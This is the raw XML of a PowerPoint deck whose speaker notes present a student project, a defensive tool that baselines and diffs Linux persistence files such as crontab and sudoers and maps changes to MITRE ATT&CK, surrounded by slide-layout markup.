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notesMasterIdLst>
    <p:notesMasterId r:id="rId17"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="379" r:id="rId2"/>
    <p:sldId id="513" r:id="rId3"/>
    <p:sldId id="514" r:id="rId4"/>
    <p:sldId id="515" r:id="rId5"/>
    <p:sldId id="516" r:id="rId6"/>
    <p:sldId id="517" r:id="rId7"/>
    <p:sldId id="518" r:id="rId8"/>
    <p:sldId id="519" r:id="rId9"/>
    <p:sldId id="520" r:id="rId10"/>
    <p:sldId id="521" r:id="rId11"/>
    <p:sldId id="522" r:id="rId12"/>
    <p:sldId id="523" r:id="rId13"/>
    <p:sldId id="524" r:id="rId14"/>
    <p:sldId id="525" r:id="rId15"/>
    <p:sldId id="526" r:id="rId1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94041" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="47" d="100"/>
          <a:sy n="47" d="100"/>
        </p:scale>
        <p:origin x="1738" y="43"/>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9" d="100"/>
          <a:sy n="59" d="100"/>
        </p:scale>
        <p:origin x="246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18445B-3D83-48F8-8074-7A945437CE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dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Date Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{914DCF11-2565-4585-B14D-DE65C8B338D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F5D7F702-C849-4981-AD7E-916FA0F2FB34}" type="datetimeFigureOut">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>10/21/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Image Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3EBBC463-3244-48B7-9B27-FE9395C46187}"/>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5410931D-B801-4759-8B55-646BB45BD9E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049E9F1-013D-4E40-8E40-E44D90C541B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dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Slide Number Placeholder 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E3CE0D85-C464-4273-89B9-031AFAC5EFEF}"/>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3850892F-F9FC-456A-BEE2-9EDE45E6D0B8}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16730125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010EEB2E-AD9B-413B-B6C3-EB5E83782000}"/>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94E90F94-B400-4281-83AE-CCE5888FF26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Good morning respected evaluators. Today, we present our MDC-CS-501 5th Semester Cyber Security project titled 'Linux Persistence Change Sentinel'. The project investigates automated file integrity baselining and change detection for critical persistence configurations on Linux systems. Presented by Arun Kumar and Abhishek Sharma under the Department of Computer Science and Engineering, MIET Jammu.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24580" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1627386B-90AB-4EC7-BBB6-8EBBD1B3E13B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:ln>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{1D71760B-D2A6-42F8-B9C5-E0C097D11814}" type="slidenum">
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>1</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1389046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agenda outlines our presentation. We will walk through the motivation and problem statement, fundamental persistence concepts, our architecture and implemented Python prototype, actual experimental results with dashboard screenshots, and critical technical limitations.</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2</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1279174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Linux environments, attackers frequently target configuration files rather than running active malware processes. Because configuration files control what executes during boot, login, or on schedule, monitoring their integrity against a known-good baseline is a fundamental defensive requirement.</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3</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3620505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 is that administrators cannot easily detect when a single unauthorized line is injected into a configuration file like crontab or sudoers. Manual audits take too long, and commercial tools are often complex black boxes. Our project provides an accessible, transparent prototype that demonstrates how baseline diffing solves this problem.</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4</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1510221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objectives cover the entire lifecycle: creating a cryptographic baseline, developing an automated change detector, producing line-by-line diffs, mapping vectors to MITRE ATT&amp;CK techniques, and building a responsive SOC dashboard to investigate findings safely.</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5</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="641568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we explain how persistence works with concrete examples. A cron job scheduled at 3 AM will execute silently as root. If an attacker injects this line, it remains dormant until triggered. We monitor cron, systemd services, sudoers, shell startup scripts, and SSH authorized keys.</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6</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1035055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is vital to define what our tool does and what it does not do. Sentinel detects and diffs changes; it provides the analyst with exact facts. It does not claim every modification is malware, because administrators also edit crontabs. It acts as an audit assistant, not an automated blocker.</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7</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2897484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diagram illustrates our 4-layer architecture: Layer 1 is the safe mock_linux sandbox. Layer 2 is the Sentinel Core Engine comprising scanner, baseline generator, change detector, and MITRE catalog. Layer 3 is structured state storage in baseline.json and events.json. Layer 4 is the CLI manager and local SOC dashboard.</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8</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1271967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major engineering achievement of this project is zero external dependencies. We did not use pip install or third-party packages. We used Python's standard library: hashlib for SHA-256, difflib for line diffs, http.server for the dashboard, and unittest for automated validation. This makes Sentinel portable, secure, and lightweight.</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9</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2970803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operational workflow consists of five stages: First, establishing the cryptographic baseline. Second, safe system operation or simulation. Third, running an automated scan that re-hashes files. Fourth, differential analysis that detects ADDED, MODIFIED, or DELETED states and maps them to MITRE ATT&amp;CK. Fifth, visual investigation on the SOC dashboard.</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10</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="393397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demonstrates how our detection engine categorizes events. In our verified demonstration, modifying the mock crontab immediately triggered a MODIFIED alert with high severity and exact line diff. We also tested adding a new file and deleting an existing service, confirming that all three state transitions function properly.</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11</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14394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an authentic screenshot of our SOC Cyber Dashboard captured live from localhost:8080. You can clearly see the active detection of /etc/crontab modification, the HIGH severity badge, the MITRE T1053.003 tag, and the DEMO MODE banner ensuring safe evaluation.</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12</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2782986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thoroughly validated our prototype using automated unit tests and end-to-end command line workflows. All four unit tests passed in 0.049 seconds. We verified baseline generation, clean audits with zero false positives, simulated change detection, and complete reset restoration.</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13</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3960246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responsible cybersecurity students, we clearly state our project limitations. The prototype was evaluated in a mock file tree on Windows, not live production Linux, and change detection does not prove intent. For future work, we plan to implement Linux inotify kernel hooks, SIEM integration, and administrative whitelisting.</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14</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1824010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respected evaluators for your time and guidance. We are now open for your questions, feedback, and discussion regarding Linux Persistence Change Sentinel.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{3850892F-F9FC-456A-BEE2-9EDE45E6D0B8}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>15</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22926976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BEFB50-DFDB-433B-8285-DB86B5D0C070}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>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E630C425-27A5-40AA-961A-8CFDE17FA4DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-9525" y="6053139"/>
            <a:ext cx="2249091"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6C71B3EE-07D3-40CD-A5C9-E7B6A7D3EB55}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2358628" y="6043614"/>
            <a:ext cx="6785372"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endParaRPr lang="en-US" dirty="0"/>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1950">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>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US"/>
              <a:t>Click to edit Master subtitle style</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Date Placeholder 27">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3733BC89-84AA-4433-89FB-B7A7E5D13F89}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="76200" y="6069013"/>
            <a:ext cx="2057400" cy="685800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr">
              <a:defRPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{E9FDA555-E7D0-42F0-AC4C-4811C25EA4F9}" type="datetime8">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>10/21/2026 6:21 AM</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Footer Placeholder 16">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{52B60891-0B66-4CA7-88CB-DE5EC0A18DED}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2085975" y="236539"/>
            <a:ext cx="5867400" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="r">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Slide Number Placeholder 28">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CBE7F8AC-DBDA-417F-981D-F15B3426B9B3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8001000" y="228600"/>
            <a:ext cx="838200" cy="381000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="1050">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{98247BE2-61CD-463C-AD78-643FCA7B2A77}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2688426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a:t>Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Content Placeholder 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="612648" y="1600200"/>
            <a:ext cx="81534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7D23AF-71EC-4251-B17F-BDD25760D152}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr dirty="0"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{A5EB19C7-A313-4953-8844-CFDFBDB67712}" type="datetime8">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>10/21/2026 6:21 AM</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DB1A2D69-AA10-4583-9E8F-0A4D9446E68E}"/>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2A6E2A9D-5CE7-4FA5-BC28-FB271F754EE7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="1050">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{78BBDA1B-EB2C-49E2-A1CF-4342CA4EF36C}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="145723055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230AD3-0C7A-45F5-A43D-9C62B1FE456E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>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4757C25B-6FC9-4FB2-9E6E-4912144234FE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>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DEC32344-6E1C-4BEB-B4E3-5CFAA72A62DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>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Text Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371601" y="2743200"/>
            <a:ext cx="7123113" cy="1673225"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:buNone/>
              <a:defRPr sz="2100">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>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3300" b="0" cap="none">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Date Placeholder 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4E06E9CF-DCA0-4469-9588-146DDA3B615C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{97650DA2-C70C-4FFB-9E2D-CA69753C4E81}" type="datetime8">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>10/21/2026 6:21 AM</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Slide Number Placeholder 12">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{024E1A5F-0041-47BD-AB34-3894313F5A86}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1752601"/>
            <a:ext cx="1295400" cy="701675"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{666A1CEC-9DD6-4F71-8FF7-224B44B36D75}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Footer Placeholder 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3F02C43B-73CC-4732-8E2B-39CB4F86C03C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="414093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7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{38A05C4A-FA42-4D8C-B6A5-0F623E6EB9A2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{02A22236-1168-4432-ABC0-6C926F115FB2}" type="datetime8">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>10/21/2026 6:21 AM</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Slide Number Placeholder 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{675BC25A-D772-4BAD-82C5-8DE60CDA0412}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="1050">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
